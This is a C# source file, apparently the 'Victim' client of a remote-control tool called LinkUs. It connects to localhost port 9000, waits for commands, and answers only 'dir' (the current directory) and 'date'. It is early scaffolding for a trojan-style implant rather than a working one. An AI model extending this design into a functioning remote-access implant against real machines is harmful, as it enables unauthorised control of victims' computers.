using System;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using LinkUs.Core;

namespace LinkUs.Victim
{
    class Program
    {
        static readonly UTF8Encoding Encoding = new UTF8Encoding();
        private static AsyncConnection _connection;

        static void Main(string[] args)
        {
            var tcpClient = new TcpClient();
            tcpClient.BeginConnect("127.0.0.1", 9000, ClientConnected, tcpClient);
            while (Console.ReadLine() != "exit") { }
            tcpClient.Close();
        }

        private static void ClientConnected(IAsyncResult result)
        {
            var tcpClient = (TcpClient) result.AsyncState;
            tcpClient.EndConnect(result);
            if (tcpClient.Connected) {
                Console.WriteLine("* Connected to client.");
                _connection = new AsyncConnection(tcpClient);
                _connection.DataReceived += ConnectionOnDataReceived;
                _connection.StartReceiving();
            }
            else {
                Console.WriteLine("* Trying to connect...");
                tcpClient.BeginConnect("127.0.0.1", 9000, ClientConnected, tcpClient);
            }
        }

        private static void ConnectionOnDataReceived(byte[] data)
        {
            var package = Package.Parse(data);
            Console.WriteLine($"* package received : {package}");
            ProcessCommand(package);
        }

        private static void ProcessCommand(Package package)
        {
            var command = Encoding.GetString(package.Content);
            if (command == "dir") {
                Thread.Sleep(1000);
                var packageResponse = package.CreateResponsePackage(Encoding.GetBytes(Directory.GetCurrentDirectory()));
                _connection.SendAsync(packageResponse.ToByteArray());
            }
            else if (command == "date") {
                var packageResponse = package.CreateResponsePackage(Encoding.GetBytes(DateTime.Now.ToShortDateString()));
                _connection.SendAsync(packageResponse.ToByteArray());
            }
        }
    }
}